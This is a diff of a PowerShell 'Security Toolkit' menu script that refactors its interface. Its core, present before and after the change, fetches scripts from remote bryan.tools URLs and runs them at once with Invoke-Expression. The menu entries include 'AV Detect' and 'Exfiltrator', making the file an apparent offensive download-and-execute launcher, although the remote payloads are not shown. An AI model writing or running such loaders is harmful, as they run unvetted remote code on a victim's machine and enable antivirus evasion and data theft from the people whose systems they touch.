@@ -1,81 +1,37 @@
-function Show-AsciiArt {
-    $ascii = @"
-    ╔════════════════════════════════════════════════╗
-    ║  ██████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗  ║
-    ║  ██╔══██╗██╔══██╗╚██╗ ██╔╝██╔══██╗████╗  ██║  ║
-    ║  ██████╔╝██████╔╝ ╚████╔╝ ███████║██╔██╗ ██║  ║
-    ║  ██╔══██╗██╔══██╗  ╚██╔╝  ██╔══██║██║╚██╗██║  ║
-    ║  ██████╔╝██║  ██║   ██║   ██║  ██║██║ ╚████║  ║
-    ║  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝  ║
-    ║                                                 ║
-    ║  ████████╗ ██████╗  ██████╗ ██╗     ███████╗  ║
-    ║  ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝  ║
-    ║     ██║   ██║   ██║██║   ██║██║     ███████╗  ║
-    ║     ██║   ██║   ██║██║   ██║██║     ╚════██║  ║
-    ║     ██║   ╚██████╔╝╚██████╔╝███████╗███████║  ║
-    ║     ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝  ║
-    ║                                                 ║
-    ║          Security Toolkit v1.0                 ║
-    ╚════════════════════════════════════════════════╝
-"@
-    $colors = @('Red', 'Yellow', 'Green', 'Cyan', 'Blue', 'Magenta')
-    $lines = $ascii -split "`n"
-    
-    for ($i = 0; $i -lt $lines.Count; $i++) {
-        $color = $colors[$i % $colors.Count]
-        # Keep the last line (Security Toolkit) in white
-        if ($i -eq $lines.Count - 2) {
-            Write-Host $lines[$i] -ForegroundColor White
-        } else {
-            Write-Host $lines[$i] -ForegroundColor $color
-        }
-    }
-}
-
-function Show-LoadingAnimation {
-    $loadingChars = '|', '/', '-', '\'
-    foreach ($char in $loadingChars * 3) {
-        Write-Host "`rInitializing [$char]" -NoNewline
-        Start-Sleep -Milliseconds 100
-    }
-    Write-Host "`r                      " -NoNewline
+# Define the tool URLs in a hashtable for better management
+$tools = @{
+    "What is my IP?" = "http://bryan.tool/Whatismtip"
+    "Am I admin?"    = "http://bryan.tools/amiadmin"
+    "AV Detect"      = "http://bryan.tools/detect"
+    "Exfiltrator"    = "http://bryan.tools/exfil"
+    "Reporter"       = "http://bryan.tools/report"
 }
 
 function Show-Menu {
-    param (
-        [int]$SelectedIndex = 0
-    )
-    $options = @(
-        "What is my IP?",
-        "Am I admin?",
-        "AV Detect",
-        "Exfiltrator",
-        "Reporter",
-        "Exit"
-    )
-
     Clear-Host
-    Show-AsciiArt
-    Write-Host "`nUse ↑/↓ arrows or numbers (1-6) to select, Enter to execute`n" -ForegroundColor Yellow
+    Write-Host "Security Toolkit v1.0`n" -ForegroundColor Cyan
+    Write-Host "Select a tool to run:`n" -ForegroundColor Yellow
 
-    for ($i = 0; $i -lt $options.Count; $i++) {
-        if ($i -eq $SelectedIndex) {
-            Write-Host "→ [$($i + 1)] $($options[$i])" -ForegroundColor Green
-        } else {
-            Write-Host "  [$($i + 1)] $($options[$i])" -ForegroundColor Gray
-        }
+    $menuIndex = 1
+    $tools.Keys | ForEach-Object {
+        Write-Host "[$menuIndex] $_" -ForegroundColor Green
+        $menuIndex++
     }
+    Write-Host "`n[0] Exit`n" -ForegroundColor Red
 }
 
-function Invoke-Tool {
+function Invoke-SelectedTool {
     param (
         [string]$Url
     )
-    Write-Host "`nExecuting script..." -ForegroundColor Yellow
     try {
-        $result = Invoke-RestMethod -Uri $Url
-        Invoke-Expression $result
-    } catch {
+        Write-Host "`nExecuting script from $Url..." -ForegroundColor Yellow
+        $result = Invoke-RestMethod -Uri $Url -UseBasicParsing
+        if ($result) {
+            Invoke-Expression $result
+        }
+    }
+    catch {
         Write-Host "Error executing script: $_" -ForegroundColor Red
     }
     Write-Host "`nPress any key to continue..."
@@ -83,48 +39,23 @@ function Invoke-Tool {
 }
 
 # Main menu loop
-$selectedIndex = 0
-$urls = @(
-    "bryan.tool/Whatismtip",
-    "bryan.tools/amiadmin",
-    "bryan.tools/detect",
-    "bryan.tools/exfil",
-    "bryan.tools/report"
-)
-
-Show-LoadingAnimation
-
 while ($true) {
-    Show-Menu -SelectedIndex $selectedIndex
+    Show-Menu
+    $choice = Read-Host "Enter your choice"
     
-    $key = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
-    
-    # Handle number keys (1-6)
-    if ($key.KeyChar -ge '1' -and $key.KeyChar -le '6') {
-        $selectedIndex = [int]($key.KeyChar - '1')
-        if ($selectedIndex -eq 5) {
-            Clear-Host
-            Write-Host "Goodbye!" -ForegroundColor Cyan
-            return
-        }
-        Invoke-Tool -Url $urls[$selectedIndex]
-        continue
+    if ($choice -eq '0') {
+        Write-Host "Goodbye!" -ForegroundColor Cyan
+        break
     }
     
-    switch ($key.VirtualKeyCode) {
-        38 { # Up arrow
-            if ($selectedIndex -gt 0) { $selectedIndex-- }
-        }
-        40 { # Down arrow
-            if ($selectedIndex -lt 5) { $selectedIndex++ }
-        }
-        13 { # Enter
-            if ($selectedIndex -eq 5) {
-                Clear-Host
-                Write-Host "Goodbye!" -ForegroundColor Cyan
-                return
-            }
-            Invoke-Tool -Url $urls[$selectedIndex]
-        }
+    $toolIndex = [int]$choice - 1
+    if ($toolIndex -ge 0 -and $toolIndex -lt $tools.Count) {
+        $selectedTool = ($tools.Keys | Select-Object -Index $toolIndex)
+        $selectedUrl = $tools[$selectedTool]
+        Invoke-SelectedTool -Url $selectedUrl
+    }
+    else {
+        Write-Host "Invalid selection. Press any key to continue..."
+        $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
     }
 }
